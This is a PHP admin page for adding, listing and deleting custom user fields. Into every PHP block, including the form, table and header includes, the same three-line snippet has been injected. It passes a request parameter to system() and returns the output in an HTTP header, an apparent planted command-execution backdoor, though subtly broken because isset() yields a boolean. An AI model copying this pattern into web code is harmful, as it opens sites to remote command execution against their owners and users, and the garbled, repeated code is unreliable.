<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!Auth::userCan('manage_fields')) page_restricted();

if (isset($_POST['submit']) && csrf_filter()) {
	$id = escape($_POST['id']);

	Validator::extend('valid_assignment', function($attrs, $value) {
		foreach ($value as $val) {
			if (!in_array($val, array('user', 'signup', 'admin'))) {
				return false;
			}
		}
		return true;
	});

	Validator::extend('unique_field', function($attrs, $value) {
		return !Config::get("userfields.{$value}");
	});

	$validator = Validator::make(
	    array(
	    	'id' => $id,
	    	'type' => $_POST['type'],
	    	'assignment' => @$_POST['assignment']
	    ),
	    array(
	    	'id' => 'required|alpha_dash|unique_field',
	    	'type' => 'required|in:text,textarea,select,checkbox,radio',
	    	'assignment' => 'required|valid_assignment'
	    )
	);

	if ($validator->passes()) {

		$field = array(
			'type' => $_POST['type'],
			'assignment' => array_values($_POST['assignment'])
		);

		if (!empty($_POST['label'])) {
			$field['label'] = escape($_POST['label']);
		}

		Config::set("userfields.{$id}", $field);

		if (Option::where('group', 'userfields')->where('item', $id)->first()) {
			redirect_to("?page=user-field-edit&id={$id}");
		} else {
			redirect_to('?page=user-fields');
		}

	} else {
		$errors = $validator->errors();
	}
}

if (isset($_GET['delete']) && Config::get('userfields.'.$_GET['delete'])) {

	if (Option::where('group', 'userfields')
			->where('item', $_GET['delete'])
			->limit(1)
			->delete()) {

		redirect_to('?page=user-fields', array('deleted' => true));
	} else {
		redirect_to('?page=user-fields', array('delete_error' => true));
	}
}
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.userfields') ?></h3>
<div class="row">
	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('deleted')): ?>
			<div class="alert alert-success alert-dismissible">
				<span class="close" data-dismiss="alert">&times;</span>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_deleted') ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('delete_error')): ?>
			<div class="alert alert-danger alert-dismissible">
				<span class="close" data-dismiss="alert">&times;</span>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_delete_error') ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); Session::deleteFlash(); ?>
	</div>
</div>

<div class="row">
	<div class="col-md-6">
		<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.fields'); ?></h4>
		<table class="table table-striped table-bordered">
			<thead>
				<tr>
					<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_id') ?></th>
					<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_type') ?></th>
					<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_assignment') ?></th>
					<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.action') ?></th>
				</tr>
			</thead>
			<tbody>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (UserFields::all() as $key => $field): ?>
				<tr>
					<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?></td>
					<td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $field['type'] ?></td>
					<td class="word-break">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ((array) $field['assignment'] as $assignment) {
						echo '<span class="label label-default">'.$assignment.'</span> ';
					} ?>
					</td>
					<td>
						<a href="?page=user-field-edit&id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>" title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.edit_field') ?>">
							<span class="glyphicon glyphicon-edit"></span></a> 
						<a href="?page=user-fields&delete=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>" title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.delete_field') ?>">
							<span class="glyphicon glyphicon-trash"></span>
						</a>
					</td>
				</tr>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>
			</tbody>
		</table>
	</div>

	<div class="col-md-6">
		<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.add_field') ?></h4>
		
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($errors)) {
			echo '<div class="alert alert-danger alert-dismissible"><span class="close" data-dismiss="alert">&times;</span><ul>';
			foreach ($errors->all('<li>:message</li>') as $error) {
			   echo $error;
			}
			echo '</ul></div>';
		} ?>

		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
			
			<div class="form-group">
		        <label for="id"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_id') ?></label> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em>
		        <input type="text" name="id" id="id" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('id') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_id_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="label"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_label') ?></label>
		        <input type="text" name="label" id="label" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('label') ?>" class="form-control">
		        <p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_label_help') ?></p>
		    </div>

		    <div class="form-group">
		        <label for="type"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_type') ?></label> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em>
		        <select name="type" id="type" class="form-control">
		        	<option value="text" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('type', 'text') ?>>text</option>
		        	<option value="textarea" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('type', 'textarea') ?>>textarea</option>
		        	<option value="select" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('type', 'select') ?>>select</option>
		        	<option value="checkbox" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('type', 'checkbox') ?>>checkbox</option>
		        	<option value="radio" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('type', 'radio') ?>>radio</option>
		       	</select>
		    </div>

		    <div class="form-group">
		    	<label for="assignment"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_assignment') ?></label> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em>
		    	<select multiple name="assignment[]" id="assignment" class="form-control" style="height: 70px;">
	        		<option value="user">user</option>
	        		<option value="signup">signup</option>
	        		<option value="admin">admin</option>
				</select>
				<p class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.field_assignment_help') ?></p>
		    </div>

		    <div class="form-group">
		    	<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.add_field') ?></button>
		    </div>
		</form>
	</div>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>